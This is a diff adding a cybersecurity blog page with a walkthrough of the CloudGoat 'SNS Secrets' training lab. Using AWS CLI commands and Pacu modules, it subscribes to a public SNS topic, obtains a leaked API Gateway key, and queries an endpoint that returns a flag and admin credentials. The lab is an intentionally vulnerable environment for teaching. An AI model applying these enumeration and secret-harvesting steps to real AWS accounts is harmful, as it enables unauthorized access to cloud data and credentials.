@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="AWS SNS Privilege Escalation WalkthroughInitial AccessWe begin with the following AWS credentials: 12sns_user_access_key_id &#x3D; [REDACTED]sns_user_secret_access_key &#x3D; [REDACTED] Let’s verify who we are">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cloudgoat-SNS-Secrets">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="AWS SNS Privilege Escalation WalkthroughInitial AccessWe begin with the following AWS credentials: 12sns_user_access_key_id &#x3D; [REDACTED]sns_user_secret_access_key &#x3D; [REDACTED] Let’s verify who we are">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sns_Secrets/found_sns.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sns_Secrets/sub_sns.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sns_Secrets/sns_mail.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sns_Secrets/sns_activation.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sns_Secrets/api_key.png">
+<meta property="article:published_time" content="2025-05-14T13:12:49.000Z">
+<meta property="article:modified_time" content="2025-05-14T10:14:31.280Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Sns_Secrets/found_sns.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cloudgoat-SNS-Secrets</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/13/Cloudgoat-Beanstalk/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&text=Cloudgoat-SNS-Secrets"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&is_video=false&description=Cloudgoat-SNS-Secrets"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-SNS-Secrets&body=Check out this article: https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&name=Cloudgoat-SNS-Secrets&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&t=Cloudgoat-SNS-Secrets"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWS-SNS-Privilege-Escalation-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">AWS SNS Privilege Escalation Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNS-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">SNS Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-SNS-Topic-Access"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting SNS Topic Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-Gateway-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">API Gateway Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Stage-Name"><span class="toc-number">1.4.1.</span> <span class="toc-text">Finding the Stage Name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-Available-Resource-Paths"><span class="toc-number">1.4.2.</span> <span class="toc-text">Identifying Available Resource Paths</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-Sensitive-Data"><span class="toc-number">1.5.</span> <span class="toc-text">Accessing Sensitive Data</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Cloudgoat-SNS-Secrets
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-14T13:12:49.000Z" class="dt-published" itemprop="datePublished">2025-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="AWS-SNS-Privilege-Escalation-Walkthrough"><a href="#AWS-SNS-Privilege-Escalation-Walkthrough" class="headerlink" title="AWS SNS Privilege Escalation Walkthrough"></a>AWS SNS Privilege Escalation Walkthrough</h1><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>We begin with the following AWS credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns_user_access_key_id = [REDACTED]</span><br><span class="line">sns_user_secret_access_key = [REDACTED]</span><br></pre></td></tr></table></figure>
+<p>Let’s verify who we are by running the <code>get-caller-identity</code> command:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile init                                              </span><br><span class="line">&#123;</span><br><span class="line">    &quot;UserId&quot;: &quot;AIDAQ6VKGD5Y4HR5QXYBV&quot;,</span><br><span class="line">    &quot;Account&quot;: &quot;065855168369&quot;,</span><br><span class="line">    &quot;Arn&quot;: &quot;arn:aws:iam::065855168369:user/cg-sns-user-cgidi78fhfoxxa&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SNS-Enumeration"><a href="#SNS-Enumeration" class="headerlink" title="SNS Enumeration"></a>SNS Enumeration</h2><p>Based on the IAM username, we can infer that this account likely has access to SNS services. Let’s use Pacu to enumerate SNS resources:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pacu (init:imported-init) &gt; run sns_enum</span><br><span class="line">Module not found. Is it spelled correctly? Try using the module search function.</span><br><span class="line">Pacu (init:imported-init) &gt; run sns__enum</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Sns_Secrets/found_sns.png" alt="Pacu SNS enumeration results"><br>We discovered one SNS topic. Let’s retrieve the specific details for this topic:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data SNS</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SNS: &#123;</span><br><span class="line">    &quot;sns&quot;: &#123;</span><br><span class="line">        &quot;us-east-1&quot;: &#123;</span><br><span class="line">            &quot;arn:aws:sns:us-east-1:065855168369:public-topic-cgidi78fhfoxxa&quot;: &#123;</span><br><span class="line">                &quot;Owner&quot;: &quot;065855168369&quot;,</span><br><span class="line">                &quot;SubscriptionsConfirmed&quot;: &quot;0&quot;,</span><br><span class="line">                &quot;SubscriptionsPending&quot;: &quot;0&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploiting-SNS-Topic-Access"><a href="#Exploiting-SNS-Topic-Access" class="headerlink" title="Exploiting SNS Topic Access"></a>Exploiting SNS Topic Access</h2><p>If our IAM user has the <code>sns:GetTopicAttributes</code> permission for the target SNS topic, we can subscribe to it to gain more information. Let’s run:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run sns__subscribe --topics arn:aws:sns:us-east-1:065855168369:public-topic-cgidi78fhfoxxa --email yourMAIL@gmail.com</span><br></pre></td></tr></table></figure>
+<p>This will trigger a subscription confirmation email:<br><img src="/images/Sns_Secrets/sub_sns.png" alt="SNS subscription confirmation email"><br><img src="/images/Sns_Secrets/sns_mail.png" alt="SNS email details"><br><img src="/images/Sns_Secrets/sns_activation.png" alt="SNS activation link"><br>Approximately one minute after confirming the subscription, we receive an email containing an API Gateway key:<br><img src="/images/Sns_Secrets/api_key.png" alt="Email with API key"></p>
+<h2 id="API-Gateway-Enumeration"><a href="#API-Gateway-Enumeration" class="headerlink" title="API Gateway Enumeration"></a>API Gateway Enumeration</h2><p>First, let’s identify the API Gateway that will accept our newly acquired API key:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">aws apigateway get-rest-apis --profile init --region us-east-1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;items&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;id&quot;: &quot;8iisigub4b&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;cg-api-cgidi78fhfoxxa&quot;,</span><br><span class="line">            &quot;description&quot;: &quot;API for demonstrating leaked API key scenario&quot;,</span><br><span class="line">            &quot;createdDate&quot;: &quot;2025-05-14T12:38:25+03:00&quot;,</span><br><span class="line">            &quot;apiKeySource&quot;: &quot;HEADER&quot;,</span><br><span class="line">            &quot;endpointConfiguration&quot;: &#123;</span><br><span class="line">                &quot;types&quot;: [</span><br><span class="line">                    &quot;EDGE&quot;</span><br><span class="line">                ],</span><br><span class="line">                &quot;ipAddressType&quot;: &quot;ipv4&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;tags&quot;: &#123;</span><br><span class="line">                &quot;Scenario&quot;: &quot;iam_privesc_by_key_rotation&quot;,</span><br><span class="line">                &quot;Stack&quot;: &quot;CloudGoat&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;disableExecuteApiEndpoint&quot;: false,</span><br><span class="line">            &quot;rootResourceId&quot;: &quot;9ehi5vsa3m&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Finding-the-Stage-Name"><a href="#Finding-the-Stage-Name" class="headerlink" title="Finding the Stage Name"></a>Finding the Stage Name</h3><p>We need to identify the deployed stages:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">aws apigateway get-stages --rest-api-id 8iisigub4b --profile init --region us-east-1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;item&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;deploymentId&quot;: &quot;62jn11&quot;,</span><br><span class="line">            &quot;stageName&quot;: &quot;prod-cgidi78fhfoxxa&quot;,</span><br><span class="line">            &quot;cacheClusterEnabled&quot;: false,</span><br><span class="line">            &quot;cacheClusterStatus&quot;: &quot;NOT_AVAILABLE&quot;,</span><br><span class="line">            &quot;methodSettings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;variables&quot;: &#123;&#125;,</span><br><span class="line">            &quot;tracingEnabled&quot;: false,</span><br><span class="line">            &quot;createdDate&quot;: &quot;2025-05-14T12:38:27+03:00&quot;,</span><br><span class="line">            &quot;lastUpdatedDate&quot;: &quot;2025-05-14T12:38:27+03:00&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Identifying-Available-Resource-Paths"><a href="#Identifying-Available-Resource-Paths" class="headerlink" title="Identifying Available Resource Paths"></a>Identifying Available Resource Paths</h3><p>Let’s enumerate the available API endpoints:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aws apigateway get-resources --rest-api-id 8iisigub4b --profile init --region us-east-1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;items&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;id&quot;: &quot;9ehi5vsa3m&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;/&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;id&quot;: &quot;jl35fp&quot;,</span><br><span class="line">            &quot;parentId&quot;: &quot;9ehi5vsa3m&quot;,</span><br><span class="line">            &quot;pathPart&quot;: &quot;user-data&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;/user-data&quot;,</span><br><span class="line">            &quot;resourceMethods&quot;: &#123;</span><br><span class="line">                &quot;GET&quot;: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Accessing-Sensitive-Data"><a href="#Accessing-Sensitive-Data" class="headerlink" title="Accessing Sensitive Data"></a>Accessing Sensitive Data</h2><p>Now we can construct our request using the API key to access the <code>/user-data</code> endpoint:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET \</span><br><span class="line">  -H &quot;x-api-key: [REDACTED]&quot; \</span><br><span class="line">  https://8iisigub4b.execute-api.us-east-1.amazonaws.com/prod-cgidi78fhfoxxa/user-data</span><br></pre></td></tr></table></figure>
+<p>Success! We retrieved the flag and administrative credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;final_flag&quot;:&quot;FLAG&#123;SNS_S3cr3ts_ar3_FUN&#125;&quot;,&quot;message&quot;:&quot;Access granted&quot;,&quot;user_data&quot;:&#123;&quot;email&quot;:&quot;[REDACTED]&quot;,&quot;password&quot;:&quot;[REDACTED]&quot;,&quot;user_id&quot;:&quot;1337&quot;,&quot;username&quot;:&quot;SuperAdmin&quot;&#125;&#125;  </span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWS-SNS-Privilege-Escalation-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">AWS SNS Privilege Escalation Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNS-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">SNS Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-SNS-Topic-Access"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting SNS Topic Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-Gateway-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">API Gateway Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Stage-Name"><span class="toc-number">1.4.1.</span> <span class="toc-text">Finding the Stage Name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-Available-Resource-Paths"><span class="toc-number">1.4.2.</span> <span class="toc-text">Identifying Available Resource Paths</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-Sensitive-Data"><span class="toc-number">1.5.</span> <span class="toc-text">Accessing Sensitive Data</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&text=Cloudgoat-SNS-Secrets"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&is_video=false&description=Cloudgoat-SNS-Secrets"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-SNS-Secrets&body=Check out this article: https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&title=Cloudgoat-SNS-Secrets"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&name=Cloudgoat-SNS-Secrets&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/14/Cloudgoat-SNS-Secrets/&t=Cloudgoat-SNS-Secrets"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
